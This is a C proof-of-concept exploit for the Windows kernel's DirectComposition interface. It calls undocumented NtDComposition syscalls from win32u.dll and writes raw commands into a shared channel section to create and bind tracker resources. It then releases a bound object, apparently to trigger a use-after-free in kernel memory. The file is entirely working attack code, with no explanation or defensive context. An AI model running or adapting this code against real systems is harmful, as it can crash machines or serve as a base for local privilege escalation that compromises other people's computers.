#include <stdio.h>
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(*pNtDCompositionCreateChannel)(
    OUT PHANDLE pArgChannelHandle,
    IN OUT PSIZE_T pArgSectionSize,
    OUT PVOID* pArgSectionBaseMapInProcess
    );

typedef NTSTATUS(*pNtDCompositionProcessChannelBatchBuffer)(
    IN HANDLE hChannel,
    IN DWORD dwArgStart,
    OUT PDWORD pOutArg1,
    OUT PDWORD pOutArg2
    );

typedef NTSTATUS(*pNtDCompositionCommitChannel)(
    IN HANDLE pArgChannelHandle,
    OUT LPDWORD out1,
    OUT LPBOOL out2,
    IN BOOL in1,
    IN HANDLE in2
    );


#define nCmdCreateResource 0x1
#define nCmdReleaseResource 0x3
#define nCmdSetBufferProperty 0xC
#define CInteractionTrackerBindingManagerMarshaler 0x5b
#define CInteractionTrackerMarshaler 0x5a

HANDLE hChannel;
PVOID pMappedAddress = NULL;  SIZE_T SectionSize = 0x4000;
DWORD dwArg1, dwArg2;
DWORD szBuff[0x400];

#define TrackerBinding1 1
#define CInteractionMarshaler1 2
#define Tracker1 3
#define CManipulationMarshaler1 4
#define Tracker3 5
#define TrackerBinding3 6

pNtDCompositionCreateChannel NtDCompositionCreateChannel;
pNtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;
pNtDCompositionCommitChannel NtDCompositionCommitChannel;

int main(int argc, TCHAR* argv[])
{

    LoadLibrary(L"user32.dll");
    NTSTATUS ntStatus;
    HMODULE win32u = LoadLibrary(L"win32u.dll");
    NtDCompositionCreateChannel = (pNtDCompositionCreateChannel)GetProcAddress(win32u, "NtDCompositionCreateChannel");
    NtDCompositionProcessChannelBatchBuffer = (pNtDCompositionProcessChannelBatchBuffer)GetProcAddress(win32u, "NtDCompositionProcessChannelBatchBuffer");
    NtDCompositionCommitChannel = (pNtDCompositionCommitChannel)GetProcAddress(win32u, "NtDCompositionCommitChannel");

    printf("[+] Create New Direct Composition Channel\n");
    ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create Direct Composition Channel\n");
        exit(-1);
    }

    printf("[*] Create channel ok, channel=0x%x\n", hChannel);

    
    printf("[+] Create First TrackerBinding Resource Object\n");
    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)TrackerBinding1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerBindingManagerMarshaler;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create Direct Composition Resource\n");
        exit(-1);
    }


    printf("[+] Create Second TrackerBinding Resource Object\n");
    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CInteractionMarshaler1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x59;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create Direct Composition Resource\n");
        exit(-1);
    }

    printf("[+] Create Tracker Resource 1 Object\n");
    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)Tracker1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerMarshaler;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create Direct Composition Resource\n");
        exit(-1);
    }

    printf("[+] Create Tracker Resource 2 Object\n");
    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CManipulationMarshaler1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x69;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create Direct Composition Resource\n");
        exit(-1);
    }

    printf("[+] Create Tracker Resource 3 Object\n");
    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)Tracker3;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerMarshaler;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create Direct Composition Resource\n");
        exit(-1);
    }

    printf("[+] Bind Tracker to the First TrackerBinding\n");
    szBuff[0] = CManipulationMarshaler1;
    szBuff[1] = CInteractionMarshaler1;

    UINT datasize = 0x8; // Size == 0x10
    *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)Tracker1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0x15;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = datasize;
    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasize);
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasize, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Bind Tracker to the First TrackerBinding \n");
        exit(-1);
    }
    *(DWORD*)pMappedAddress = nCmdReleaseResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CManipulationMarshaler1;
    NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
}